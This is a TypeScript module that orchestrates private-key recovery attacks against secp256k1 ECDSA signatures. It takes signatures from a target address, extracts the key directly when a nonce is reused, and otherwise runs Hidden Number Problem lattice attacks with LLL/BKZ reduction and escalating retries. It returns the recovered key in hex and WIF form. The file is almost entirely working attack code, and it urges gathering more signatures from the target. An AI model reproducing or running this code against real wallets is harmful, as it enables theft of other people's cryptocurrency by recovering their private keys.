/**
 * Attack Orchestrator - Unified attack management with dynamic setup selection
 * 
 * This module provides:
 * 1. Automatic detection of appropriate attack strategy (HNP, SVP, CVP, Nonce Reuse)
 * 2. Dynamic lattice construction based on signature patterns
 * 3. Iterative retry logic with parameter adjustment
 * 4. Intelligent fallback strategies when attacks fail
 */

import { ParsedSignature } from './dataParser'
import { runBKZ, BKZResult } from './bkz'
import { runLLL, LLLResult } from './lll'
import { runPrecisionLLL, runPrecisionBKZ } from './precision-wrapper'
import { 
  buildHNPLattice, 
  buildEmbeddedHNPLattice, 
  buildKannanEmbeddingLattice,
  HNPLatticeResult 
} from './hnp-lattice-builder'
import { selectDimension, DimensionSelectionResult, estimateBiasBits, selectBlockSize } from './dimension-selector'
import { interpretBKZResult, InterpreterResult, isKeyFound, getRetryRecommendation } from './result-interpreter'

// ============================================================================
// Attack Strategy Types
// ============================================================================

export type AttackStrategy = 
  | 'nonce_reuse'      // Direct k extraction from reused nonce
  | 'hnp_standard'     // Standard Hidden Number Problem lattice
  | 'hnp_embedded'     // Embedded HNP with additional constraints
  | 'hnp_kannan'       // Kannan embedding (CVP to SVP conversion)
  | 'svp_direct'       // Direct SVP approach for small matrices
  | 'combined'         // Try multiple strategies in sequence

export type AttackPhase = 
  | 'analyzing'
  | 'building_lattice'
  | 'reducing'
  | 'interpreting'
  | 'retrying'
  | 'complete'
  | 'failed'

export interface AttackProgress {
  phase: AttackPhase
  message: string
  progress: number  // 0-100
  currentStrategy?: AttackStrategy
  attemptNumber?: number
  totalAttempts?: number
}

export interface AttackConfiguration {
  strategy: AttackStrategy
  algorithm: 'lll' | 'bkz'
  delta: number
  blockSize: number
  dimension: number
  latticeType: 'standard' | 'embedded' | 'kannan'
  usePrecision: boolean
}

export interface AttackAttempt {
  configuration: AttackConfiguration
  latticeResult?: HNPLatticeResult
  reductionResult?: BKZResult | LLLResult
  interpreterResult?: InterpreterResult
  executionTimeMs: number
  success: boolean
  failureReason?: string
}

export interface OrchestratorResult {
  success: boolean
  strategy: AttackStrategy
  attempts: AttackAttempt[]
  finalResult?: InterpreterResult
  privateKeyHex?: string
  privateKeyWIF?: string
  derivedAddress?: string
  recommendations?: string[]
  totalExecutionTimeMs: number
}

export interface OrchestratorConfig {
  targetAddress?: string
  maxAttempts?: number
  enableRetry?: boolean
  strategies?: AttackStrategy[]
  initialBlockSize?: number
  maxBlockSize?: number
  usePrecision?: boolean
  onProgress?: (progress: AttackProgress) => void
}

// ============================================================================
// Signature Pattern Analysis
// ============================================================================

interface SignaturePatternAnalysis {
  hasNonceReuse: boolean
  nonceReusePairs: Array<[ParsedSignature, ParsedSignature]>
  hasBiasedNonces: boolean
  estimatedBiasBits: number
  hasSequentialNonces: boolean
  hasSmallRValues: boolean
  recommendedStrategy: AttackStrategy
  signatureCount: number
}

const SECP256K1_N = BigInt('0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141')

/**
 * Normalize a hex string to have '0x' prefix
 */
function normalizeHex(hex: string): string {
  return hex.startsWith('0x') ? hex : '0x' + hex
}

/**
 * Analyze signature patterns to determine the best attack strategy
 */
export function analyzeSignaturePatterns(signatures: ParsedSignature[]): SignaturePatternAnalysis {
  const signatureCount = signatures.length
  
  // Check for nonce reuse (same r values)
  const rValueMap = new Map<string, ParsedSignature[]>()
  for (const sig of signatures) {
    const rStr = sig.r.toString()
    const existing = rValueMap.get(rStr) || []
    existing.push(sig)
    rValueMap.set(rStr, existing)
  }
  
  const nonceReusePairs: Array<[ParsedSignature, ParsedSignature]> = []
  for (const [, sigs] of rValueMap) {
    if (sigs.length >= 2) {
      nonceReusePairs.push([sigs[0], sigs[1]])
    }
  }
  const hasNonceReuse = nonceReusePairs.length > 0
  
  // Estimate bias in nonces
  const estimatedBiasBits = estimateBiasBits(signatures)
  const hasBiasedNonces = estimatedBiasBits >= 3
  
  // Check for sequential nonces (k values that increment)
  let hasSequentialNonces = false
  for (let i = 1; i < signatures.length && !hasSequentialNonces; i++) {
    const rDiff = signatures[i].r - signatures[i - 1].r
    if (rDiff > 0n && rDiff < 1000n) {
      hasSequentialNonces = true
    }
  }
  
  // Check for small r values (indicates small nonces)
  const smallRThreshold = SECP256K1_N >> 128n  // r < 2^128 indicates potential small nonce
  const smallRCount = signatures.filter(sig => sig.r < smallRThreshold).length
  const hasSmallRValues = smallRCount > 0
  
  // Determine recommended strategy
  let recommendedStrategy: AttackStrategy
  if (hasNonceReuse) {
    recommendedStrategy = 'nonce_reuse'
  } else if (signatureCount >= 40 && hasBiasedNonces) {
    recommendedStrategy = 'hnp_standard'
  } else if (signatureCount >= 20 && signatureCount < 40) {
    recommendedStrategy = 'hnp_kannan'
  } else if (signatureCount >= 60) {
    recommendedStrategy = 'hnp_embedded'
  } else {
    recommendedStrategy = 'combined'  // Try multiple approaches
  }
  
  return {
    hasNonceReuse,
    nonceReusePairs,
    hasBiasedNonces,
    estimatedBiasBits,
    hasSequentialNonces,
    hasSmallRValues,
    recommendedStrategy,
    signatureCount
  }
}

// ============================================================================
// Attack Configuration Generation
// ============================================================================

/**
 * Generate attack configurations for different strategies
 */
function generateAttackConfigurations(
  analysis: SignaturePatternAnalysis,
  dimensionSelection: DimensionSelectionResult,
  config: OrchestratorConfig
): AttackConfiguration[] {
  const configs: AttackConfiguration[] = []
  const usePrecision = config.usePrecision ?? true
  const initialBlockSize = config.initialBlockSize ?? 20
  const maxBlockSize = config.maxBlockSize ?? 35
  
  const dimension = dimensionSelection.selectedDimension
  const recommendedBlockSize = selectBlockSize(dimension)
  
  // Strategy 1: Standard HNP
  if (analysis.recommendedStrategy !== 'nonce_reuse') {
    configs.push({
      strategy: 'hnp_standard',
      algorithm: 'bkz',
      delta: 0.99,
      blockSize: Math.min(recommendedBlockSize, maxBlockSize),
      dimension,
      latticeType: 'standard',
      usePrecision
    })
  }
  
  // Strategy 2: Kannan embedding (good for medium-sized problems)
  if (dimension >= 20 && dimension < 60) {
    configs.push({
      strategy: 'hnp_kannan',
      algorithm: 'bkz',
      delta: 0.99,
      blockSize: Math.min(recommendedBlockSize + 5, maxBlockSize),
      dimension,
      latticeType: 'kannan',
      usePrecision
    })
  }
  
  // Strategy 3: Embedded HNP (more constraints)
  if (dimension >= 35) {
    configs.push({
      strategy: 'hnp_embedded',
      algorithm: 'bkz',
      delta: 0.99,
      blockSize: Math.min(recommendedBlockSize, maxBlockSize),
      dimension,
      latticeType: 'embedded',
      usePrecision
    })
  }
  
  // Strategy 4: LLL for smaller matrices (faster)
  if (dimension < 30) {
    configs.push({
      strategy: 'svp_direct',
      algorithm: 'lll',
      delta: 0.99,
      blockSize: 0,  // Not used for LLL
      dimension,
      latticeType: 'standard',
      usePrecision
    })
  }
  
  // Add retry configurations with higher block sizes
  if (config.enableRetry !== false) {
    const baseConfig = configs[0]
    if (baseConfig && baseConfig.algorithm === 'bkz') {
      // Add progressively larger block sizes for retries
      for (let bs = baseConfig.blockSize + 5; bs <= maxBlockSize; bs += 5) {
        configs.push({
          ...baseConfig,
          blockSize: bs,
          strategy: baseConfig.strategy
        })
      }
    }
  }
  
  return configs
}

// ============================================================================
// Nonce Reuse Attack
// ============================================================================

/**
 * Execute nonce reuse attack (direct key extraction)
 * When k1 = k2, we have:
 * s1 = k^(-1)(z1 + r*d) mod n
 * s2 = k^(-1)(z2 + r*d) mod n
 * Therefore: k = (z1 - z2) * (s1 - s2)^(-1) mod n
 * And: d = (s1*k - z1) * r^(-1) mod n
 */
async function executeNonceReuseAttack(
  pair: [ParsedSignature, ParsedSignature],
  targetAddress?: string
): Promise<InterpreterResult> {
  const [sig1, sig2] = pair
  
  try {
    // Extract z values (message hashes)
    const z1 = BigInt(normalizeHex(sig1.hash))
    const z2 = BigInt(normalizeHex(sig2.hash))
    
    // Calculate k from nonce reuse
    const zDiff = ((z1 - z2) % SECP256K1_N + SECP256K1_N) % SECP256K1_N
    const sDiff = ((sig1.s - sig2.s) % SECP256K1_N + SECP256K1_N) % SECP256K1_N
    
    if (sDiff === 0n) {
      return {
        status: 'NOT_FOUND',
        message: 'Nonce reuse attack failed: identical s values',
        confidence: 0
      }
    }
    
    const sDiffInv = modInverse(sDiff, SECP256K1_N)
    const k = (zDiff * sDiffInv) % SECP256K1_N
    
    // Recover private key: d = (s*k - z) * r^(-1) mod n
    const rInv = modInverse(sig1.r, SECP256K1_N)
    const sk = (sig1.s * k) % SECP256K1_N
    const skMinusZ = ((sk - z1) % SECP256K1_N + SECP256K1_N) % SECP256K1_N
    const privateKey = (skMinusZ * rInv) % SECP256K1_N
    
    if (privateKey <= 0n || privateKey >= SECP256K1_N) {
      return {
        status: 'NOT_FOUND',
        message: 'Nonce reuse attack failed: invalid private key derived',
        confidence: 0
      }
    }
    
    const privateKeyHex = '0x' + privateKey.toString(16).padStart(64, '0')
    
    return {
      status: 'KEY_FOUND',
      message: 'Attacking... Key Found! (Nonce Reuse) 🎉',
      privateKey,
      privateKeyHex,
      confidence: 1.0,
      details: {
        nonceGuessed: k,
        signatureIndex: 0
      }
    }
  } catch (error) {
    return {
      status: 'NOT_FOUND',
      message: `Nonce reuse attack failed: ${error instanceof Error ? error.message : 'unknown error'}`,
      confidence: 0
    }
  }
}

/**
 * Extended Euclidean algorithm for modular inverse
 */
function modInverse(a: bigint, m: bigint): bigint {
  a = ((a % m) + m) % m
  
  if (a === 0n) throw new Error('No modular inverse exists')
  
  let [old_r, r] = [a, m]
  let [old_s, s] = [1n, 0n]
  
  while (r !== 0n) {
    const quotient = old_r / r
    ;[old_r, r] = [r, old_r - quotient * r]
    ;[old_s, s] = [s, old_s - quotient * s]
  }
  
  if (old_r > 1n) throw new Error('a is not invertible')
  
  return ((old_s % m) + m) % m
}

// ============================================================================
// Lattice Attack Execution
// ============================================================================

/**
 * Build lattice based on configuration
 */
function buildLattice(
  signatures: ParsedSignature[],
  config: AttackConfiguration,
  biasBits: number
): HNPLatticeResult {
  switch (config.latticeType) {
    case 'embedded':
      return buildEmbeddedHNPLattice(signatures, biasBits)
    case 'kannan':
      return buildKannanEmbeddingLattice(signatures, biasBits)
    case 'standard':
    default:
      return buildHNPLattice(signatures, biasBits)
  }
}

/**
 * Convert BigInt matrix to number matrix for reduction algorithms
 */
function convertBigIntBasisToNumber(basis: bigint[][]): number[][] {
  let maxVal = 1n
  for (const row of basis) {
    for (const val of row) {
      const absVal = val < 0n ? -val : val
      if (absVal > maxVal) {
        maxVal = absVal
      }
    }
  }
  
  const MAX_SAFE = BigInt(Number.MAX_SAFE_INTEGER)
  if (maxVal <= MAX_SAFE) {
    return basis.map(row => row.map(val => Number(val)))
  }
  
  const scaleFactor = (maxVal + MAX_SAFE - 1n) / MAX_SAFE
  return basis.map(row => 
    row.map(val => Number(val / scaleFactor))
  )
}

/**
 * Execute a single attack attempt
 */
async function executeAttackAttempt(
  signatures: ParsedSignature[],
  config: AttackConfiguration,
  targetAddress?: string,
  onProgress?: (progress: AttackProgress) => void
): Promise<AttackAttempt> {
  const startTime = performance.now()
  const attempt: AttackAttempt = {
    configuration: config,
    executionTimeMs: 0,
    success: false
  }
  
  try {
    // Build lattice
    onProgress?.({
      phase: 'building_lattice',
      message: `Building ${config.latticeType} lattice (${config.dimension}×${config.dimension})...`,
      progress: 20,
      currentStrategy: config.strategy
    })
    
    const biasBits = 4  // Default bias estimate
    const latticeResult = buildLattice(signatures, config, biasBits)
    attempt.latticeResult = latticeResult
    
    // Convert to number matrix
    const numberBasis = convertBigIntBasisToNumber(latticeResult.basis)
    
    // Run reduction
    onProgress?.({
      phase: 'reducing',
      message: `Running ${config.algorithm.toUpperCase()}${config.algorithm === 'bkz' ? '-' + config.blockSize : ''} reduction...`,
      progress: 40,
      currentStrategy: config.strategy
    })
    
    let reductionResult: any
    if (config.usePrecision) {
      if (config.algorithm === 'bkz') {
        reductionResult = runPrecisionBKZ(numberBasis, config.blockSize, config.delta, false)
      } else {
        reductionResult = runPrecisionLLL(numberBasis, config.delta, false)
      }
    } else {
      if (config.algorithm === 'bkz') {
        reductionResult = runBKZ(numberBasis, config.blockSize, config.delta, false)
      } else {
        reductionResult = runLLL(numberBasis, config.delta, false)
      }
    }
    
    attempt.reductionResult = reductionResult
    
    // Interpret results
    onProgress?.({
      phase: 'interpreting',
      message: 'Interpreting reduction results...',
      progress: 80,
      currentStrategy: config.strategy
    })
    
    const interpreterResult = await interpretBKZResult(
      reductionResult,
      signatures,
      {
        targetAddress,
        bias: 0n,
        scalingFactor: latticeResult.scalingFactor || 1n
      }
    )
    
    attempt.interpreterResult = interpreterResult
    attempt.success = isKeyFound(interpreterResult)
    
    if (!attempt.success) {
      const retry = getRetryRecommendation(interpreterResult)
      if (retry.shouldRetry) {
        attempt.failureReason = retry.reason
      } else {
        attempt.failureReason = interpreterResult.message
      }
    }
    
  } catch (error) {
    attempt.failureReason = error instanceof Error ? error.message : 'Unknown error'
  }
  
  attempt.executionTimeMs = performance.now() - startTime
  return attempt
}

// ============================================================================
// Main Orchestrator
// ============================================================================

/**
 * Run the attack orchestrator with automatic strategy selection and retry logic
 */
export async function runAttackOrchestrator(
  signatures: ParsedSignature[],
  config: OrchestratorConfig = {}
): Promise<OrchestratorResult> {
  const startTime = performance.now()
  const maxAttempts = config.maxAttempts ?? 5
  const attempts: AttackAttempt[] = []
  
  const onProgress = config.onProgress
  
  // Phase 1: Analyze signature patterns
  onProgress?.({
    phase: 'analyzing',
    message: 'Analyzing signature patterns...',
    progress: 5
  })
  
  const analysis = analyzeSignaturePatterns(signatures)
  
  // Phase 2: Handle nonce reuse (direct attack, no lattice needed)
  if (analysis.hasNonceReuse && analysis.nonceReusePairs.length > 0) {
    onProgress?.({
      phase: 'reducing',
      message: 'Nonce reuse detected! Executing direct key recovery...',
      progress: 50,
      currentStrategy: 'nonce_reuse'
    })
    
    for (const pair of analysis.nonceReusePairs) {
      const result = await executeNonceReuseAttack(pair, config.targetAddress)
      
      if (isKeyFound(result)) {
        onProgress?.({
          phase: 'complete',
          message: 'Key recovered via nonce reuse!',
          progress: 100,
          currentStrategy: 'nonce_reuse'
        })
        
        return {
          success: true,
          strategy: 'nonce_reuse',
          attempts: [{
            configuration: {
              strategy: 'nonce_reuse',
              algorithm: 'lll',
              delta: 0,
              blockSize: 0,
              dimension: 0,
              latticeType: 'standard',
              usePrecision: false
            },
            interpreterResult: result,
            executionTimeMs: performance.now() - startTime,
            success: true
          }],
          finalResult: result,
          privateKeyHex: result.privateKeyHex,
          privateKeyWIF: result.privateKeyWIF,
          derivedAddress: result.derivedAddress,
          totalExecutionTimeMs: performance.now() - startTime
        }
      }
    }
  }
  
  // Phase 3: Run dimension selection
  const dimensionSelection = selectDimension(signatures, {
    expectedBiasBits: analysis.estimatedBiasBits
  })
  
  if (!dimensionSelection.isValid) {
    onProgress?.({
      phase: 'failed',
      message: dimensionSelection.insufficientDataReason || 'Insufficient data for attack',
      progress: 100
    })
    
    return {
      success: false,
      strategy: analysis.recommendedStrategy,
      attempts: [],
      recommendations: [
        `Need at least ${dimensionSelection.minRequiredRows} signatures for ${analysis.estimatedBiasBits}-bit bias attack`,
        'Try gathering more signatures from the target address',
        'Consider using a different attack vector'
      ],
      totalExecutionTimeMs: performance.now() - startTime
    }
  }
  
  // Phase 4: Generate attack configurations
  const attackConfigs = generateAttackConfigurations(analysis, dimensionSelection, config)
  
  // Phase 5: Execute attacks with retry logic
  let attemptNumber = 0
  for (const attackConfig of attackConfigs) {
    if (attemptNumber >= maxAttempts) break
    attemptNumber++
    
    onProgress?.({
      phase: 'reducing',
      message: `Attempt ${attemptNumber}/${Math.min(attackConfigs.length, maxAttempts)}: ${attackConfig.strategy} with ${attackConfig.algorithm.toUpperCase()}-${attackConfig.blockSize}`,
      progress: 20 + (attemptNumber / maxAttempts) * 60,
      currentStrategy: attackConfig.strategy,
      attemptNumber,
      totalAttempts: Math.min(attackConfigs.length, maxAttempts)
    })
    
    const attempt = await executeAttackAttempt(
      signatures.slice(0, dimensionSelection.selectedDimension),
      attackConfig,
      config.targetAddress,
      onProgress
    )
    
    attempts.push(attempt)
    
    if (attempt.success && attempt.interpreterResult) {
      onProgress?.({
        phase: 'complete',
        message: 'Key Found! Attack successful.',
        progress: 100,
        currentStrategy: attackConfig.strategy
      })
      
      return {
        success: true,
        strategy: attackConfig.strategy,
        attempts,
        finalResult: attempt.interpreterResult,
        privateKeyHex: attempt.interpreterResult.privateKeyHex,
        privateKeyWIF: attempt.interpreterResult.privateKeyWIF,
        derivedAddress: attempt.interpreterResult.derivedAddress,
        totalExecutionTimeMs: performance.now() - startTime
      }
    }
    
    // Check if we should try a different strategy
    if (attempt.interpreterResult) {
      const retry = getRetryRecommendation(attempt.interpreterResult)
      if (!retry.shouldRetry && attemptNumber >= 3) {
        // Stop if no retry recommended and we've tried several times
        break
      }
    }
  }
  
  // Phase 6: Attack failed
  onProgress?.({
    phase: 'failed',
    message: 'Attack did not recover private key',
    progress: 100
  })
  
  // Generate recommendations based on attempts
  const recommendations: string[] = []
  if (attempts.length > 0) {
    const lastAttempt = attempts[attempts.length - 1]
    if (lastAttempt.interpreterResult?.status === 'RETRY_HIGHER_BLOCK_SIZE') {
      recommendations.push('Consider using a higher block size (β > 30)')
    }
    if (analysis.signatureCount < 50) {
      recommendations.push(`Current: ${analysis.signatureCount} signatures. Consider gathering 50+ for better success rate`)
    }
    if (analysis.estimatedBiasBits < 4) {
      recommendations.push('Low estimated bias. This attack may require more specialized techniques')
    }
  }
  recommendations.push('Try using Modal compute for faster BKZ with larger block sizes')
  
  return {
    success: false,
    strategy: analysis.recommendedStrategy,
    attempts,
    recommendations,
    totalExecutionTimeMs: performance.now() - startTime
  }
}

/**
 * Get a summary of available attack strategies for given signatures
 */
export function getAttackStrategySummary(signatures: ParsedSignature[]): {
  analysis: SignaturePatternAnalysis
  dimensionInfo: DimensionSelectionResult
  recommendations: string[]
} {
  const analysis = analyzeSignaturePatterns(signatures)
  const dimensionInfo = selectDimension(signatures, {
    expectedBiasBits: analysis.estimatedBiasBits
  })
  
  const recommendations: string[] = []
  
  if (analysis.hasNonceReuse) {
    recommendations.push('⚡ CRITICAL: Nonce reuse detected! Direct key recovery possible.')
  }
  
  if (!dimensionInfo.isValid) {
    recommendations.push(`⚠️ ${dimensionInfo.insufficientDataReason}`)
  } else {
    recommendations.push(`✓ ${dimensionInfo.selectedDimension}×${dimensionInfo.selectedDimension} lattice possible`)
    recommendations.push(`✓ Recommended strategy: ${analysis.recommendedStrategy}`)
    recommendations.push(`✓ Estimated bias: ${analysis.estimatedBiasBits} bits`)
    
    if (dimensionInfo.batchCount > 1) {
      recommendations.push(`📦 Will use ${dimensionInfo.batchCount} batches for parallel attack`)
    }
  }
  
  return { analysis, dimensionInfo, recommendations }
}
